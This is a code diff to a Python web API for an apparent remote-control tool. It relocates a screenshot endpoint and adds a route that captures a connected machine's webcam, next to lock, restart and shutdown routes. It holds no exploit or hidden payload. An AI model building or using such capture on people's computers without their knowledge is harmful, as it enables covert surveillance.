@@ -20,6 +20,7 @@ connectionRequiredRoutes = [
     '/api/restart-computer',
     '/api/shutdown-computer',
     '/api/screenshot',
+    '/api/webcam',
 ]
 
 def get_connection_id():
@@ -96,16 +97,6 @@ def SendMessage():
     else:
         return jsonify({'sent': False, 'message': 'Unable to Send Message'})
     
-@api.post('/api/screenshot')
-def Screenshot():
-    global connection
-
-    result = api.Screenshot(connection)
-    if (result is not None):
-        return jsonify({'captured': True, 'message': 'Screenshot Captured', 'image': str(result, 'utf-8')})
-    else:
-        return jsonify({'captured': False, 'message': 'Unable to Capture Screenshot', 'data': None})
-    
 @api.post('/api/lock-computer')
 def LockComputer():
     global connection
@@ -132,3 +123,23 @@ def ShutdownComputer():
         return jsonify({'shutdown': True, 'message': 'Computer Shutdown'})
     else:
         return jsonify({'shutdown': False, 'message': 'Unable to Shutdown Computer'})
+    
+@api.post('/api/screenshot')
+def Screenshot():
+    global connection
+
+    result = api.Screenshot(connection)
+    if (result is not None):
+        return jsonify({'captured': True, 'message': 'Screenshot Captured', 'image': str(result, 'utf-8')})
+    else:
+        return jsonify({'captured': False, 'message': 'Unable to Capture Screenshot', 'image': None})
+    
+@api.post('/api/webcam')
+def Webcam():
+    global connection
+
+    result = api.Webcam(connection)
+    if (result is not None):
+        return jsonify({'captured': True, 'message': 'Webcam Captured', 'image': str(result, 'utf-8')})
+    else:
+        return jsonify({'captured': False, 'message': 'Unable to Capture Webcam', 'image': None})
